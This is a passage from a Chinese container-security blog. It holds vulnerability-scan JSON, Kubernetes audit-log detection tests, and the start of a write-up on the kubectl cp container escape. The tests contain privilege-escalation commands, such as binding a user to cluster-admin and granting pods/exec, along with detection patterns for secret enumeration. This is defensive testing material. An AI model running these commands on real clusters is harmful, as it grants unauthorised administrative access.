class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-08-24T21:00:58.176344Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;upgrades&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;minor&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.18.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-09-29T00:13:31.931497Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;fixed_vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;patch&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.16.7&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-08-07T22:13:31.226553Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;fixed_vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-11-27</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约1919个字, 6分钟23秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/10/20/Kubernetes%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%AD%96%E7%95%A5-%E9%9B%86%E7%BE%A4%E8%AE%BF%E9%97%AE%E5%BC%82%E5%B8%B8/">Kubernetes日志审计策略-集群访问异常</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
<h2 id="检测分析"><a href="#检测分析" class="headerlink" title="检测分析"></a>检测分析</h2><h3 id="异常行为检测-集群角色拥有pod-exec权限-（或者拥有其他权限）"><a href="#异常行为检测-集群角色拥有pod-exec权限-（或者拥有其他权限）" class="headerlink" title="异常行为检测-集群角色拥有pod&#x2F;exec权限 （或者拥有其他权限）"></a>异常行为检测-集群角色拥有pod&#x2F;exec权限 （或者拥有其他权限）</h3><p>测试项名称：异常行为检测-集群角色拥有pod&#x2F;exec权限 </p>
<p>测试内容：系统支持对集群异常行为进行检测</p>
<p>测试要求：能正常检测到入侵行为</p>
<p>测试步骤：</p>
<ol>
<li><p>登录集群节点</p>
</li>
<li><p>创建集群角色</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply role.yaml</span><br></pre></td></tr></table></figure>

<p>role.yaml文件内容如下</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">rwildcard</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>] <span class="comment"># &quot;&quot; indicates the core API group </span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods/exec&quot;</span>] </span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>登录容器安全平台,查看是否检测到该风险行为</li>
</ol>
<h4 id="开启日志审计功能"><a href="#开启日志审计功能" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>准备审计文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>审计rbac.authorization.k8s.io组中的roles资源的create动作</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">omitStages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">level:</span> <span class="string">Request</span></span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">        <span class="attr">resources:</span> [<span class="string">&quot;roles&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>配置 API 服务器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在 <code>spec.containers.command</code> 下添加命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- --audit-log-maxage=30</span><br><span class="line">- --audit-log-maxbackup=1</span><br><span class="line">- --audit-log-maxsize=100</span><br><span class="line">- --audit-log-path=/var/log/audit/kube-apiserver-audit.log</span><br><span class="line">- --audit-policy-file=/etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>
</li>
<li><p>在 <code>spec.containers.volumeMounts</code> 下添加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- mountPath: /var/log/audit</span><br><span class="line">  name: audit-logs</span><br><span class="line">- mountPath: /etc/kubernetes/audit-policy</span><br><span class="line">  name: audit-policy</span><br></pre></td></tr></table></figure>
</li>
<li><p>在 <code>spec.volumes</code> 下添加：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- hostPath:</span><br><span class="line">  path: /var/log/kubernetes/audit</span><br><span class="line">  type: &quot;&quot;</span><br><span class="line">  name: audit-logs</span><br><span class="line">- hostPath:</span><br><span class="line">  path: /etc/kubernetes/audit-policy</span><br><span class="line">  type: &quot;&quot;</span><br><span class="line">  name: audit-policy</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>查看日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>分析日志内容，并重点关注特征字段</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
</tr>
</thead>
<tbody><tr>
<td>“verbs”:[“create”,”get”,”watch”,”list”]</td>
<td>“resources”:[“pods&#x2F;exec”]</td>
</tr>
</tbody></table>
<h3 id="异常行为检测-绑定用户到集群管理员角色"><a href="#异常行为检测-绑定用户到集群管理员角色" class="headerlink" title="异常行为检测-绑定用户到集群管理员角色"></a>异常行为检测-绑定用户到集群管理员角色</h3><p>测试项名称：异常行为检测-绑定用户到集群管理员角色</p>
<p>测试内容：系统支持对集群异常访问进行监控</p>
<p>测试要求：能正常检测到异常行为</p>
<p>前置条件：已经根据页面帮助信息配置集群审计规则点击【设置】-【内置策略】开启对应报警</p>
<p>测试步骤：</p>
<ol>
<li><p>登录集群master节点</p>
</li>
<li><p>执行如下命令：</p>
</li>
<li><p>将匿名用户绑定到管理员角色 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding root-cluster-admin-binding --clusterrole=cluster-admin --user=root </span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="开启日志审计功能-1"><a href="#开启日志审计功能-1" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>准备审计文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>审计rbac.authorization.k8s.io组中的clusterrolebindings资源的create动作</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">level:</span> <span class="string">Request</span></span><br><span class="line">  <span class="attr">users:</span> [<span class="string">&quot;kubernetes-admin&quot;</span>]</span><br><span class="line">  <span class="attr">userGroups:</span> [<span class="string">&quot;system:masters&quot;</span>,<span class="string">&quot;system:authenticated&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">      <span class="attr">resources:</span> [<span class="string">&quot;clusterrolebindings&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p>查看日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>分析日志内容，并重点关注特征字段</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>“resource”: “clusterrolebindings”</td>
<td>“kind”:”ClusterRoleBinding”</td>
<td>“name”:”root”</td>
</tr>
</tbody></table>
<h3 id="异常行为检测-Secrets异常访问"><a href="#异常行为检测-Secrets异常访问" class="headerlink" title="异常行为检测-Secrets异常访问"></a>异常行为检测-Secrets异常访问</h3><h4 id="开启日志审计功能-2"><a href="#开启日志审计功能-2" class="headerlink" title="开启日志审计功能"></a>开启日志审计功能</h4><p>准备审计文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>审计默认组中的secrets资源的list动作</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">omitStages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;ResponseStarted&quot;</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">level:</span> <span class="string">RequestResponse</span></span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;list&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">group:</span></span><br><span class="line">      <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="日志分析-2"><a href="#日志分析-2" class="headerlink" title="日志分析"></a>日志分析</h4><p>查看日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>分析日志内容，并重点关注特征字段</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>“requestURI”:”&#x2F;api&#x2F;v1&#x2F;secrets?limit&#x3D;500”</td>
<td>“description”:”Data contains the secret data</td>
<td>“kubernetes.io&#x2F;service-account-token”</td>
</tr>
</tbody></table>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-10-20</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约867个字, 2分钟53秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/10/09/CVE-2019-1002101%20kubectl%20cp%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">CVE-2019-1002101 kubectl cp容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Twistlock的流程图很好的解释了kubectl cp漏洞的利用链及其原理。</p>
<ol>
<li><p>启动一个被破坏或者恶意的容器</p>
</li>
<li><p>攻击者准备一个恶意的tar包（包含恶意软链接，例如：.&#x2F;baddir&#x2F;twist-&gt;&#x2F;proc&#x2F;self&#x2F;cwd）</p>
</li>
<li><p>此时容器中的二进制tar包被替换成恶意tar包</p>
</li>
<li><p>用户运行kubectl cp将文件从容器传输到宿主机</p>
</li>
<li><p>kubectl提取恶意tar包中的文件（此时会解析其中的恶意软链接，即写入到宿主机的 &#x2F;proc&#x2F;self&#x2F;cwd 路径）</p>
</li>
<li><p>攻击者可以控制恶意软链接，将文件写到宿主机任意位置</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/bug.jpg" alt="bug"></p>
</li>
</ol>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Redhat Openshift_Container_Platform 3.10</p>
